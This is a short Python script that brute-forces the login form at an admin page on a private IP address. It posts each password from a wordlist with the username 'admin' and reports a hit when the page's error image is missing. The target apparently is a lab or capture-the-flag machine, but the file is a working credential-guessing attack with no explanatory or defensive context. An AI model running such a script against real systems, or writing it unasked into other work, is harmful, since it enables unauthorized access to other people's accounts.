import requests

url = "http://10.18.125.219:8000/admin/"
error_message = "../images/WrongAnswer.gif"

try:
    with open("passwordlist.txt", 'r') as f:
        for line in f:
            # print(f"Trying {line}")
            # print(path)
            try:
                req = requests.post(url, data = 
                { "username" : "admin",
                "password" : line.strip(),
                "Login" : "Login"
                } )
                if error_message not in req.text:
                    print(f"CREDENTIAL FOUND! admin:{line.strip()}")
                    exit()
                else:
                    print(f"WRONG: {line.strip()}")
            except Exception as e:
                print(str(e))
    f.close()
except:
    print("Error")

print("Scan Complete")
